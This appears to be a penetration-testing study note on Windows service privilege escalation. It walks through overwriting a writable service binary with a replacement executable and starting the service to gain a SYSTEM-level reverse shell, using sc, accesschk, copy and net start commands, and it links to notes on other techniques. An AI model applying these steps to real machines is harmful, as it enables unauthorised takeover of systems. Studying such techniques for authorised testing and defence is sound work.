# Service PE Vectors 

##### Insecure Service Executable 
1. Query  *SERVICE_NAME* and check if it runs with *SYSTEM* privileges (*SERVICE_START_NAME*).

```
sc qc filepermsvc
```

2. Using *[accesschk.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk*, note that the service binary (*BINARY_PATH_NAME)* file is writable by everyone:

```
accesschk.exe /accepteula -quvw "EXE/PATH.exe"
```

3. Copy the REPLACEMENT.exe executable and replace the EXE_NAME.exe with it:

```
copy REPLACEMENT.exe "EXE_NAME.exe" /Y
```

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

```
net start SERVICE_NAME
```

##### DLL Hijacking 
[obsidian://open?vault=Security%20%26%20PenTesting&file=Privilege%20Escalation%2FWindows%2FServices%2FDLL%20Hijacking](obsidian://open?vault=Security%20%26%20PenTesting&file=Privilege%20Escalation%2FWindows%2FServices%2FDLL%20Hijacking)

##### Unquoted Service Path
[obsidian://open?vault=Security%20%26%20PenTesting&file=Privilege%20Escalation%2FWindows%2FServices%2FUnquoted%20Service%20Path%2FUnquoted%20Service%20Path](obsidian://open?vault=Security%20%26%20PenTesting&file=Privilege%20Escalation%2FWindows%2FServices%2FUnquoted%20Service%20Path%2FUnquoted%20Service%20Path)

##### Weak Registry Permissions
[obsidian://open?vault=Security%20%26%20PenTesting&file=Privilege%20Escalation%2FWindows%2FRegistry%2FWeak%20Permissions%20-%20Services](obsidian://open?vault=Security%20%26%20PenTesting&file=Privilege%20Escalation%2FWindows%2FRegistry%2FWeak%20Permissions%20-%20Services)